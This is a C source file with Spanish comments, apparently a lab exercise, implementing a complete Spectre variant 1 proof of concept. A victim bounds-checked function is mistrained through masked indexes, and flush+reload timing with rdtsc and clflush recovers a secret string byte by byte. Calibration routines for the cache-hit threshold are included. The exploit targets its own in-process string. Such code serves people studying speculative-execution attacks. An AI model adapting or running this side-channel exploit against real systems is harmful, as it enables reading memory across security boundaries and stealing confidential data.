#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <x86intrin.h>
#include "spectre.h"


/* ------------------- VICTIM CODE -------------------- */
int array1_size = 32;
char * confidential_data = "Datos confidenciales.";

//2^6 B/line / 1 B/char = 2^6 (64) char/line 
// Cada char 1 Byte, 8 bits 2^8 = 256 huecos como minimo necesarios, 
// mas luego suficiente separacion para que no coincidan en una misma 
// linea de cache

void getData(size_t offset){
    if(offset< array1_size)
        aux = array2[array1[offset]*CACHE_LINE_SIZE];
}

/* ---------------------------------------------------- */


/* Dada una direccion, comprueba si esta esta o no
 * en memoria. 
 */

inline unsigned int time(void * adr){
    unsigned int time;
    asm volatile(
        "mfence\n\t"
        "lfence\n\t"
        "rdtsc\n\t"     //---Carga tiempo
        "lfence\n\t"
        "movl %%eax, %%ebx \n\t"    //---Guarda valor en registro ebx
        "movb (%[ADR]), %%dl \n\t"   //---Carga la direccion a memoria
        "lfence\n\t"
        "rdtsc\n\t"     //---Carga tiempo
        "subl %%ebx, %%eax \n\t"    //--Obten tiempo que a tardado el movl
        //"clflush (%[ADR])\n\t"    //--Limpia cache del valor traido a memoria
        : "=&a" (time)   // Output: tiempo--> + porque sino el compilador le da por usar ese registro
        :  [ADR] "c" (adr) //Input: Direccion
        : "ebx", "edx"
        );
    return time ;
}

/* Inline por eficiencia ademas de si por alguna razon la especulacion
 * difiere si cambias de funcion
 */
inline void misstrain(size_t index){
    int i,r;
    char mask;
    size_t conf= (size_t)confidential_data - (size_t)array1; // Posicion relativa de los datos confidenciales
    for(i=0;i<200;i++){ // 200 veces se accede a la funcion
        r = rand() %32; // Valor aleatorio de manera que no se pueda predecir
        mask = (r<5) * 255; // Mascara, sera todo unos un 6 % de las veces.
        // Se usa una mascara para que el predictor no pueda saber
        // cuando hay un mal acceso ( condicionales podrian ayudarle )
        r = (mask & (conf+index)) | (~mask & r); 
        _mm_clflush(&array1_size);
        _mm_mfence();
        _mm_lfence();
        getData(r); // Acceso
        _mm_mfence();
        _mm_lfence();
    }

}

/* Realizacion completa de la vulnerabilidad, guardamos el tiempo de acceso de acceso los
 * datos y se devuelven.
*/
void acceso_virtual(unsigned int datos[][LEVELS], unsigned int * timing){
    int d,i,j,u,nj;
    unsigned int hits[BYTE];
    for(d=0;d<STR_SIZE;d++){ // Realizar por cada char del string
        for(j=0;j<BYTE;j++){ // Limpieza del array de al cache
            hits[j] = 0;
            _mm_clflush(&array2[j*CACHE_LINE_SIZE]);
        }
        _mm_mfence();
        _mm_lfence();

        for(i=0;i<TRIES;i++){ // Realizarlo TRIES numero de veces
            misstrain(d);

            //aux += array2[2*CACHE_LINE_SIZE]; // Probar el acceso de manera mas simple 
            //size_t conf= (size_t)confidential_data - (size_t)array1; // Posicion relativa de los datos confidenciales
            //getData(conf+4); // Probar acceso a un valor especifico
            //_mm_mfence();
            //_mm_lfence();

            for(j=0;j<BYTE;j++){ // Por cada posicion, medir el tiempo
                //int nj = ord[j]; 
                // Se realiza de manera desordenada para evitar traida de datos
                // de manera predictiva (stride prediction)
                nj = rand()%BYTE; 
                int b = time(&array2[nj*CACHE_LINE_SIZE]);
                hits[nj] += (b< THRESSHOLD);
                _mm_clflush(&array2[nj*CACHE_LINE_SIZE]);
                //datos[nj] += b;
            }
    }
        // Elegir el indice con mayor valor, el de segundo mayor valor etc
        for(u=0;u<LEVELS;u++) datos[d][u] = 1;
        for(j=1;j<BYTE-1;j++) datos[d][0] = hits[datos[d][0]]<hits[j] ? j : datos[d][0];
        timing[d] = hits[datos[d][0]];
        timing[STR_SIZE] = aux;
        for(u=1;u<LEVELS;u++) for(j=1;j<BYTE-1;j++) datos[d][u] = (hits[datos[d][u]]<hits[j]&& j != datos[d][u-1]) ? j: datos[d][u];
        
    }

}

/* Antes de realizar el algoritmo, comprobar el funcionamiento primero de
 * flush and reload y luego del acceso a datos de manera virtual
 */
void pruebasCache(){
    int i,j,u;
    printf("Pruebas diferentes offsets");
    for(i=1;i<=1024*8;i*=2){
        char prueba[2*i];
        int t1=0, t2=0;
        for(j=0;j<10000;j++){
            _mm_clflush(prueba);
            _mm_clflush(&prueba[i]);
           t1 += time(prueba);
           t2 += time(&prueba[i]);
        }
        printf("i:%4d t1:%4u t2:%4u / tries:%d\n",i,t1/j,t2/j,j); 
    }

    printf("\nPruebas diferentes offsets, flush al principio\n");
    for(i=1;i<=1024*8;i*=2){
        int n = 8, t[n];
        char prueba[n*i];
        for(u=0;u<n;u++) t[u] = 0;
        for(j=0;j<10000;j++){
            _mm_mfence();
            _mm_lfence();
            for(u=0;u<n;u++)_mm_clflush(&prueba[u*i]);
            _mm_mfence();
            _mm_lfence();
            aux += prueba[3*i];
            _mm_mfence();
            _mm_lfence();
            for(u=0;u<n;u++) t[u] += time(&prueba[u*i]);
            
        }
        printf("i:%4d---------------------------------------------------------------\n\t",i);
        for(u=0;u<n;u++) printf("|t%d:%4u ",u,t[u]/j);
        printf("/ tries:%d\n",j); 
    }
        printf("\n\n"); 


    printf("Pruebas diferentes offsets, flush constante\n");
    for(i=64;i<=1024*8;i*=2){
        int n = 8, t[n];
        char prueba[n*i];
        for(u=0;u<n;u++) t[u] = 0;
        for(u=0;u<n;u++) _mm_clflush(&prueba[u*i]);
        _mm_mfence();
        _mm_lfence();
        for(j=0;j<10000;j++){
            aux += prueba[3*i];
            _mm_mfence();
            _mm_lfence();
            for(u=0;u<n;u++){
                int nu = rand()%n;
                t[nu] += time(&prueba[nu*i]);
                _mm_clflush(&prueba[nu*i]);
            }
            
        }
        printf("i:%4d---------------------------------------------------------------\n\t",i);
        for(u=0;u<n;u++) printf("|t%d:%4u ",u,t[u]/j);
        printf("/ tries:%d\n",j); 
    }
    printf("\n\n"); 


    printf("Pruebas diferentes offsets, flush constante, thresshold\n");
    for(i=64;i<=1024*8;i*=2){
        int n = 16, t[n];
        char prueba[n*i];
        for(u=0;u<n;u++) t[u] = 0;
        for(u=0;u<n;u++) _mm_clflush(&prueba[u*i]);
        _mm_mfence();
        _mm_lfence();


        for(j=0;j<10000;j++){
            aux += prueba[3*i];
            _mm_mfence();
            _mm_lfence();
            for(u=0;u<n;u++){
                int nu = rand()%n;
                t[nu] += (time(&prueba[nu*i])< THRESSHOLD);
                _mm_clflush(&prueba[nu*i]);
            }
            
        }
        printf("i:%4d---------------------------------------------------------------\n\t",i);
        for(u=0;u<n;u++) printf("|t%d:%4u ",u,t[u]);
        printf("~/ tries:%d\n",j); 
    }
    printf("\n\n"); 

    {
    printf("Pruebas flush constante, thresshold\n");
    int n = 64, t[n];
    i = CACHE_LINE_SIZE;/*64*/
    for(u=0;u<n;u++) t[u] = 0;
    for(u=0;u<n;u++) _mm_clflush(&array2[u*i]);
    _mm_mfence();
    _mm_lfence();


    for(j=0;j<10000;j++){
        aux += array2[3*i];
        _mm_mfence();
        _mm_lfence();
        for(u=0;u<n;u++){
            int nu = rand()%n;
            t[nu] += (time(&array2[nu*i])< THRESSHOLD);
            _mm_clflush(&array2[nu*i]);
        }
        
    }
    printf("i:%4d---------------------------------------------------------------\n\t",i);
    for(u=0;u<n;u++) printf("|t%d:%4u ",u,t[u]);
    printf("~/ tries:%d\n",j); 
    printf("\n\n"); 
    }

    {
    printf("Pruebas flush al principio, thresshold\n");
    int n = 64, t[n];
    i = CACHE_LINE_SIZE;/*64*/
    for(u=0;u<n;u++) t[u] = 0;
    for(u=0;u<n;u++) _mm_clflush(&array2[u*i]);
    _mm_mfence();
    _mm_lfence();


    for(j=0;j<10000;j++){
        for(u=0;u<n;u++) _mm_clflush(&array2[u*i]);
        _mm_mfence();
        _mm_lfence();
        aux += array2[3*i];
        _mm_mfence();
        _mm_lfence();
        for(u=0;u<n;u++){
            int nu = rand()%n;
            t[nu] += (time(&array2[nu*i])< THRESSHOLD);
        }
        
    }
    printf("i:%4d---------------------------------------------------------------\n\t",i);
    for(u=0;u<n;u++) printf("|t%d:%4u ",u,t[u]);
    printf("~/ tries:%d\n",j); 
    printf("\n\n"); 
    }


}




int main(int argc, char *argv[]){
   unsigned int t_cached=0,t_no_cached=0,n=100000,i,j ;
   unsigned int t2_cached=0,t2_no_cached=0;
   for(i=0;i<ARRAY2_SIZE;i++) array2[i] = 1; // Inicializar el array, sino da resultados inconsistentes
   char *ptr = "H" ; // Pruebas sencillas para seleccionar THRESSHOLD
   //int * datos;
   for(i=0;i<n;i++){
        t_cached += time(&array1_size);
        _mm_mfence();
        _mm_clflush(&array1_size);
        t_no_cached += time(&array1_size);
    }
  // for(i=0;i<n;i++){
  //      _mm_mfence();
  //      _mm_clflush(&array1_size);
  //      t_no_cached += time(&array1_size);
  //  }
   for(i=0;i<n;i++){
        t2_cached += time(ptr);
        _mm_mfence();
        _mm_clflush(ptr);
        t2_no_cached += time(ptr);
    }
 //  for(i=0;i<n;i++){
 //       _mm_mfence();
 //       _mm_clflush(ptr);
 //       t2_no_cached += time(ptr);
 //   }

    printf("Time cached const:%u\n", t_cached/n);
    printf("Time no cached const:%u\n", t_no_cached/n);
    printf("Time cached ptr:%u\n", t2_cached/n);
    printf("Time no cached ptr:%u\n", t2_no_cached/n);
    printf("Size int:%lu\t Size char:%lu\n",sizeof(int),sizeof(char));
    unsigned int datos[STR_SIZE][LEVELS],timing[STR_SIZE+1];
    acceso_virtual(datos,timing);
    for(j=0;j<LEVELS;j++){
        for(i=0;i<STR_SIZE;i++){
            printf("%c",datos[i][j]);
        }
        printf("\n");
    }
    printf("\n");
    for(i=0;i<STR_SIZE;i++) printf("%d ", datos[i][0]);
    printf("\n");
    for(i=0;i<STR_SIZE;i++) printf("%d ", timing[i]);
    printf("\n");
 //   pruebasCache();

    

    return 0;
}
